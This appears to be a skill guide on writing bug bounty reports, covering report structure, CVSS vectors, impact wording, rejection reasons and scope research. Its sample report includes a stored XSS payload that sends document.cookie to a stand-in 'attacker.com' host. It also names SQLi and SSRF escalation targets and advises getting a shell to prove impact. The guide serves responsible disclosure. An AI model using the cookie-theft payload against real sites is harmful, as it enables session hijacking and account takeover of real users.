---
name: bug_bounty_reporting
description: Bug bounty report writing for HackerOne, Bugcrowd, Intigriti — structure, CVSS, impact, and acceptance criteria
---

# Bug Bounty Report Writing

A high-quality report gets triaged faster, rated higher severity, and paid sooner. Focus on: clear reproduction steps, demonstrated impact, and business context.

## Report Structure (H1/Bugcrowd Standard)

```markdown
# [Vulnerability Type] in [Endpoint/Component] — [Brief Impact]
# Example: Stored XSS in profile bio field allows account takeover

## Summary
[2-3 sentences. What is the vulnerability? Where? What can an attacker do?]
Example: A stored XSS vulnerability in the profile bio field allows an attacker
to inject arbitrary JavaScript that executes in the context of any user who 
views the affected profile, enabling session hijacking and account takeover.

## Severity
**CVSS v3.1 Score:** 8.8 (High)
**Vector:** CVSS:3.1/AV:N/AC:L/PR:L/UI:R/S:C/C:H/I:H/A:N

## Steps to Reproduce

**Prerequisites:** [Account type needed, or "none"]

1. Log in to https://target.com with a test account
2. Navigate to Profile → Edit Bio
3. Enter the following payload in the Bio field:
   ```
   <img src=x onerror="fetch('https://attacker.com/?c='+document.cookie)">
   ```
4. Click Save
5. Log in as a different user (victim) and view the attacker's profile
6. Observe that the victim's cookies are sent to attacker.com

## Proof of Concept

[Screenshot of payload injected]
[Screenshot of cookie exfiltration in attacker's server logs]
[Video recording if complex (Loom/YouTube unlisted)]

**Request:**
```http
POST /api/profile/update HTTP/1.1
Host: target.com
Cookie: session=victim_session_token
Content-Type: application/json

{"bio":"<img src=x onerror=\"fetch('https://attacker.com/?c='+document.cookie)\">"}
```

**Response confirming storage:**
```http
HTTP/1.1 200 OK
{"success":true,"bio":"<img src=x onerror=...>"}
```

## Impact

An attacker who exploits this vulnerability can:
- **Account Takeover**: Steal session cookies of any user who views the profile,
  then use those cookies to fully impersonate the victim account
- **Credential Theft**: Inject a fake login form to capture passwords
- **Privilege Escalation**: If an admin views the profile, attacker gains admin access
- **Data Exfiltration**: Access any data visible to the victim user

**Business Impact**: This vulnerability affects all [X million] registered users
who could view profiles. An attacker could take over admin accounts, leading to
full platform compromise.

## Remediation

1. **Immediate**: Sanitize bio field output using context-appropriate encoding
   (HTML entity encoding for HTML context, JavaScript encoding for JS context)
2. **Implement CSP**: Add `Content-Security-Policy: default-src 'self'` header
3. **Use a library**: DOMPurify for client-side sanitization, or
   OWASP Java HTML Sanitizer / bleach (Python) for server-side

## Supporting Resources

- OWASP XSS Prevention Cheat Sheet: https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html
- CVSSv3.1 Calculator: https://www.first.org/cvss/calculator/3.1
```

## CVSS Scoring for Common Bug Classes

```
# RCE (Unauthenticated) — Critical 9.8
AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H

# RCE (Authenticated) — High 8.8
AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H

# SQLi (read+write, auth) — High 8.1
AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N

# SSRF → internal network — High 7.5
AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N

# IDOR (sensitive PII) — High 7.5
AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N

# Stored XSS → session hijack — High 8.8
AV:N/AC:L/PR:L/UI:R/S:C/C:H/I:H/A:N

# Reflected XSS — Medium 6.1
AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N

# CSRF (account settings change) — Medium 6.5
AV:N/AC:L/PR:N/UI:R/S:U/C:N/I:H/A:N

# Account takeover via token leak — Critical 9.3
AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:N

# LPE (local → root) — High 7.8
AV:L/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H
```

## Impact Language by Vulnerability Type

```
# For IDOR:
"An attacker with a valid account can access/modify any [resource type] belonging 
to any other user by changing the [id/uuid] parameter in the request, without 
requiring any special privileges."

# For SQLi:
"This vulnerability allows an attacker to extract the entire database contents,
including [user credentials/PII/payment data], and potentially write arbitrary 
data or achieve remote code execution via [load_file/INTO OUTFILE/xp_cmdshell]."

# For SSRF:
"An attacker can make the server perform HTTP requests to internal services,
potentially accessing the AWS metadata endpoint (169.254.169.254), internal 
APIs, databases, and other non-public services not accessible from the internet."

# For Auth Bypass:
"An attacker can access authenticated endpoints without valid credentials,
bypassing the authentication mechanism entirely and gaining access to all 
user data and administrative functions."

# For RCE:
"An unauthenticated attacker can execute arbitrary operating system commands
with the privileges of the web server process, leading to full server compromise,
data exfiltration, lateral movement within the network, and potential ransomware 
deployment."
```

## Common Rejection Reasons & How to Avoid Them

| Rejection Reason | Fix |
|-----------------|-----|
| "Not reproducible" | Include exact HTTP requests, step-by-step, test account details |
| "Out of scope" | Check scope carefully, read program policy before reporting |
| "Duplicate" | Assume duplicates exist — report fast, with extra detail |
| "Informational only" | Show concrete impact — get shell/access real data |
| "Needs self-interaction" | Show how attacker can trigger without victim involvement |
| "Low severity" | Chain with other issues; show higher business impact |
| "Won't fix" | Sometimes just how it is — move on |

## Automated Report Generation

When writing a bug bounty report, structure it as:
1. **Title**: `[VulnType] in [specific endpoint/feature] allows [impact]`
2. **Severity**: Calculate CVSS, cite vector string
3. **Summary**: 2-3 sentences, who/what/impact
4. **Steps**: Exact numbered steps, include raw HTTP where relevant
5. **PoC**: Screenshots, HTTP logs, video — more is better
6. **Impact**: Business impact in plain language for non-technical triagers
7. **Remediation**: Specific fix, reference to OWASP/CWE

## Scope Research

```bash
# HackerOne program scope (requires login):
# https://hackerone.com/programs/<program_name>/policy_scopes

# Bugcrowd scope:
# https://bugcrowd.com/programs/<program_name>/policy

# Parse scope from program JSON:
curl -s "https://api.hackerone.com/v1/hackers/programs/<handle>" \
  -u "username:api_key" | jq '.relationships.structured_scopes.data[].attributes'
```

## Duplicate Avoidance

```bash
# Search disclosed reports before reporting:
# HackerOne: https://hackerone.com/hacktivity?querystring=<target_name>
# Bugcrowd: https://bugcrowd.com/disclosures?target=<target>

# Search GitHub for PoCs:
# https://github.com/search?q=<target>+CVE+OR+vulnerability+OR+XSS+OR+SQLi

# Search exploitdb:
searchsploit <target_name>
```
